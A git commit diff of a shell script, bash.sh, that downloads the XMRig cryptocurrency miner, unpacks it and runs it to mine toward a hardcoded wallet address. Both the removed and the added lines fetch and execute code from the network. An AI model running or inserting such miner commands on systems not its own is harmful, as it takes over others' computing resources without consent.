84bd1748a78d950509a0646a06ce1694f09d67c2
divx597000 <45193629+divx597000@users.noreply.github.com>
2022-01-19 05:40:11 +0100

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,5 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-ls
-cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u 86R92BDf6QdDinGC8ZwdHn6JRr927pBiUExMqE2fGJEyRPhQgQr2tPeUS97wW5ZnrV5GwAh4U9brQVG45uGpY8qf9bMTjpA -k --tls --rig-id rig
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TEVbPyKcmdNDekpbeZCuyQXsv8nFafdMNr.WORKERNAME -p x
